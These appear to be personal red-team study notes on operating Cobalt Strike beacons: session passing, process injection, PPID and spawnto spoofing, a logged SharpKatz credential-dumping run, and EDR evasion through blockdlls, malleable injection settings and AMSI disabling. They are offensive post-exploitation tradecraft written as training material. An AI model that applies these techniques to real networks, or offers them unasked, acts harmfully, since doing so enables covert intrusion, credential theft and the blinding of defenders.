
- Beacon management
	- Sessiong passing
	- Executing files
	- File browser
		- How to exfiltrate data
	- User exploitation
		- Taking screenshots and logging keystroke etc.
- General Trade craft




# Beacon management

- Access
	- Manipulating identiy and privileges
- Explore
	- Gather data or control target
- Pivoting
	- Tunnel data through beacon payload
- Session
	- Options to manage access
- Help
	- To get a list of commands
- Sleep time
	- Its an async payload
		- When you generate a command you generate a queue for that particular session
	- Set sleep time to 60 seconds with 50% jitter
		- `sleep 60 50`
	- Jitter
		- The range of time when the beacon calls home weill be between 30 and 60 seconds
- Agent context
	- cd, pwd, setenv
- File system
	- cp, drives, ls, mkdir, mv, rm
	- download, upload
- Process management
	- kill, ps
- Query the registry
	- reg query, reg queryv
- Console Tips
	- CTRL+D
		- To close the console
	- CTRL+K 
		- clears the console screen
	- CTRL+F
		- Opens a find tool to search the console
		- Works in other tabs too mostly
- Beacons management
	- clear 
		- this is used when making a BEACON COMMAND, NOT TO CLEAR THE TERMINAL
		- **THIS IS TO CLEAR THE BEACON COMMAND TASK QUEUE**
- Session passing
	- Spawn and inject
		- Beacon -> spawn or spawn [arch] [listener]
	- spawn with alternate parent and inject
		- spawnu (pid) (listener)
	- Inject into specific process
		- inject (pid) (arch) (listener)



# What is fork and run?

when it wants to do something like a screenshot or inject a payload these are the steps it will do

1. Spawn a new process
2. it will inject the capability into it
3. then it will execute
4. It will provide the output through named pipe into the original named pipe
5. and then the new process will terminate itself
	1. Side note if you inject a beacon the process will STAY up until the beacon is presumably dead

## Before you spawn anything

- not all process trees are treated equally
- Things that buy your process credibility
	- valid digital signature from a trusted entity
	- a plausible/safe parent process
	- A process not normally seen in offensive activity
- **DO NOT**
	- Operate from an unsafe context (?)
		- Can lead to agent being found more likely by human or automated solution
	- Spawn to an unsafe context
		- For a similar reason as above


So how do we play it safe?


# Session prepping

- Configure "safe" temporary processes
	- use `ps` to survey processes on target
	- use `ppid` to anchor to a specific parent process
	- Use `spawnto (arch) (ptah) (arg)` to change program cobalt strike launches for temporary processes
	- Use `blockdlls start` to enable DLL blocking (blinds userland hooks (caveats apply) on windows 10)



## Example

right click -> explore -> process list

if you are in cmd.exe or powershell.exe, you could inject to another process. an example could be a java updater application thats running

passing a session to another server

right click -> explore -> process list

### Setting PPID

and pick something that creates children, an example with internet explore right click on it and then it should be come with a pop up saying `set PPID`, in the CLI it looks like this `PPID <PPID>`.

![[Pasted image 20240926224926.png]]


### Setting Spawnto
now to set the spawnto value, you want to set it to the application your running as your `PPID`

```
spawnto x86 C:\program files (x86)\internet explorer\iexplorer.exe
```


### Passing session to another team server





# Execute

- run a command get output
	- run command
- change to another folder
	- `cd c:\folder`
- Print working directory
	- `pwd`
- Use powershell through beacon
- import a script
	- `powershell-import /path/to/script.ps1`
	- Doesnt touch disk but there are implications to this
	- does use powershell.exe so it is suspicious
- Use script
	- powershell cmdlet args
- Get help for a script
	- `Powershell get-help cmdlet -Full`
- Use a .NET assembly through beacon
	- `execute-assembly /local/file.exe args`
	- is an example of fork and run
- run a command via cmd.exe
	- `shell (command) (args)`
- run powershell without powershell.exe
	- `powerpick (cmdlet) (args)`
- run powershell within another process
	- `psinject [pid] [arch] [cmdlet] [args]`




```
shell dir /S /B c:\ | findstr "zabbix_agentd.exe"
```


then lets say u get the location for jucheck.exe

```
spawnto x86 C:\Program Files (x86)\Common Files\Java\Java Update\jucheck.exe 
```


now our temporary jobs will run in the context of java update checks, now lets try out the run command, run a program that we specify and gives us back the output

```
run arp -a
```




## Execute 

```
[09/26 16:00:41] beacon> execute-assembly /home/kali/tool/SharpKatz.exe privilege::debug
[09/26 16:00:41] [*] Tasked beacon to run .NET program: SharpKatz.exe privilege::debug
[09/26 16:00:42] [+] host called home, sent: 343772 bytes
[09/26 16:00:44] [+] received output:
[*]
[*] 			System Information
[*] ----------------------------------------------------------------------
[*] | Platform: Win32NT                                                  |
[*] ----------------------------------------------------------------------
[*] | Major: 10            | Minor: 0             | Build: 20348         |
[*] ----------------------------------------------------------------------
[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
[*] ----------------------------------------------------------------------
[*]
[x] Error: Could not find LogonSessionList signature
[09/26 16:00:49] [+] received output:
[*] Authentication Id	: 0;354588 (00000000:00354588)
[*] Session		:  from 0
[*] UserName		: DC$
```




## User exploitation

- sleep 0
- `desktop (pid) (arch) (low | high)`
- Use `desktop` by itself to spawn a temporary process and inject to it
	- Fork & run basically
- Use `low` quality option for bandwidth constrained C2 channels



## Trade craft

- Instrumentation
	- the techniques to give an analyst or security product visibility into endpoint activity
- Telemetry
	- the events and properties of these events made available to the analyst or security product via the endpoint instrumentation



![[Pasted image 20240927133204.png]]

https://github.com/SwiftOnSecurity/sysmon-config


- process injection
	- Highly scrutinized in offensive security
	- very expensive and not worth it
- ProcessCreates
	- Also expensive because whether sysmon is in use or not, all defence products will be looking for process creates, looking at arguments & parents
- Network connection
	- Why is notepad connecting to the internet lol
	- have your connection match the application, examples;
		- have your HTTP beacon be based in a wininet


- detection
	- looking at a event in isolation and its properies
	- or a string of events in order and their chain while looking at their telemetry


## Instrumentation and telemetry

- Observable does not mean observed
	- visibility in telemetry is first step to detection strategy
	- false positive exceptions are offense safe-space
	- human analyst may not understand and properly action event when observed
- Evasion strats
	- disable the instrumentation
	- spoof event properties to fool instrumentation
	- avoid opsec-expensive behaviors
	- adjust operations to blend in with legitimate activity or work within false positive exceptions (when known)
	- Change offense model (e.g. agentless post-exploitation, for example not using beacon but doing shit remotely)
https://www.cobaltstrike.com/blog/pushing-back-on-userland-hooks-with-cobalt-strike


## Change your Offense model

- behaviors (event)
	- write a file to disk
	- execute a program
	- inject into new or existing process
- Process context (event property)
	- Essentially avoid frequently abused process contexts as you will get easily detected
		- Explorer.exe
		- lsass.exe
		- notepad.exe
		- powershell.exe
		- rundll32.exe
		- svchost.exe
		- Other commonly used application
- Post exploitation tool (memory injected DLL)
- PowerShell & .NET (special Case)
	- Functions, Strings and memory patterns from offensive tooling


### Session prepping helps make your shit safer, always have awareness of your process context, your parent and the process context your child processes will launch in


## Block DLLs Case Study

- instrumentation strategy
	- load user-land DLL into new processes
	- hook functions associated with offense activity
	- watch calls, analyze augments, look for bad stuff
- Evasion options
	- Remove userland hooks and restore capability
	- load and execute capability BEFORE hooking
	- Block userland DLL load into new process
	- unload userland DLL from process (if allowed)
- BlockDLLs start
	- Launch child processes with extended startup attribute to deny non-Microsoft signed DLLs in child process
	- Prevents load of user-land DLL into child processes
	- Allows post-exploitation jobs (and other spawn+inject capabilities) to run without hooks (in some cases)
- Know your Tools and their behaviors
	- blockDLLs start uses a startup attribute that is only available in windows 10 circa late-2017 and later
	- Attribute does not block Microsoft-signed DLLs
	- Impacts new processes run by beacon
	- No impact
		- Current process, user-driven attacks, etc.
	- Only **impacts** NEW processes created by THAT specific beacon session, it doesnt impact anything else, it doesnt impact even the current processes
	- Assess and understand defenses
		- Some products rely on userland hooks, others dont
		- Some products may ask Microsoft to sign their DLLs to allow DLL load when this attribute is present
	- Decide the best option to use
	- also **note** 
		- microsoft signed != microsoft developed


## Malleable process injection

- Malleable C2 profile lets us basically customize how the process injection goes down, specifically in the process inject block
- it allows us to change the characteristics, content & behavior when the beacon does process injection & an example being
	- specifically in the `set allocator` option allows us to choose between 2 options 
		- `virtualallocEx`
		- `NtMapViewOfSection`
	- To allocate data in and data to in a remote process
	- Another example would be changing the characteristics of the memory in the remote process
		- `set min_alloc "16384"`
		- `set userwx    "false"`
	- Interms of content
		- `transform-x86`
		- `transform-x64`
	- These blocks shape the content thats being injected into a remote process
	- While the execute block gives you control over how the beacon spawns a thread or otherwise passes execution tocode that you copied to a remote process
		- the way it works is that you specify you want beacon to try
		- when it has to do process injection it will check each option to se if its plausible for the current context
			- If that option succeeds its done!, its over then
			- if it does not it goes on to the next option

### Deeper dive into process injection -> execute block

- three process-inject situations
	- **NOTE, ORDER THEM LIKE THIS. 1.SELF INJECTION OPTIONS | 2. FORK & RUN OPTIONS | 3.REMOTE INJECTION OPTIONS**
	- self-inject
	- fork & run
	- remote inject
		- into another existing process
- Cover all circumstances
	- x86 -> x64
	- x64 -> x86
	- cross-session
- Most visible functions (sysmon event 8)
	- CreateRemoteThread
	- RtlCreateUserThread
- Avoid mdule-less threads?
	- CreateRemoteThread "module!function+0x##"
- For more detail read the malleable pe, malleable post exploitation documentation


## OverView of Process Injection

![[Pasted image 20240927154502.png]]



## Memory injected DLL &  detections opportunities

- Behaviors
	-  it has to find the GetProcAddress function pointers, this alone acts as a detection opportunity
		- EAF + Detection 
			- Context
				- we have a process, within this process our memory injected dll / shellcode. the first thing it has to do is it has to find the address of getprocaddress and loadLibrary because without this information it cannot find the WinAPI to call them, no function? = no functionality
				- what does our shellcode do?, the info we want is in a DLL called kernel32 and its mapped into the process space but we dont know, specifically a section called the export table happens to have this information that we want
				- there another Data structure called the PEB (process execution block) which is available in a findable location, so what we do is we read the peb to find the kernel32 and we then get the export table
				- then we have the pointers we need to start doing shit
			- Detection
				- Option One
					- is to set a hardware breakpoint on certain pages that might get red as apart of this kernel23 process, so when we try to read it
					- this passes the control to the security product that set the hardware breakpoint, this creates a chance to read the source of the read and the destination
					- with that information it can be used to decide what to do next, if its to raise an alert, deny the action, or even allow the action
					- at this point these 3 actions are dependent on the configuration of the product, the system and whats doing it
					- what they do is that they also look at where the read is coming from
						- if its a module from a legit binary on disk
						- or just freely floating RWX memory?
						- or is it from a pre-mapped DLL?
					- These determine if you get an allow, an alert, or a deny
			- Evasion? (memory injected DLL evasions)
				- behaviour
					- set post-ex -> smartinject to true
					- the post ex block controls the post exploitation of cobalt strike
				- thread start address
					- Controlled by process-inject configuration
				- Memory permissions
					- Controlled by process-inject configurations
				- Memory Content
					- set post ex -> obfuscate to true
					- does basic obfuscate
	- LoadLibrary
- Thread Start Address
	- No module associated with the start address
	- DLLs are memory mapped files, inject DLLs? no
- Memory permissions
	- RWS
		- these permissions are a common pattern in offensive tools
	- Odd AllocationProtect, Protect Pairs
- Mmeory conetnt
	- Signs of a PE file
	- Strings associateed with toolset or common techniques


## Powershell & .NET evasion

- set post-ex -> amsi_disable to true in profile
	- DOES NOT AFFECT POWERSHELL COMMAND
	- mucks with the amsi dll and memory
	- might bite you in the ass very much a cat and mouse game
- use powerpick or psinject instead of powershell
- be aware of PowerShell import
	- creates a localhost-only web server
	- prepends a download cradle to each command
	- customize download and powershell commands via resource kit


**The things we use to hide, are the things they use to detect**

### Documentation






# Extra persistence




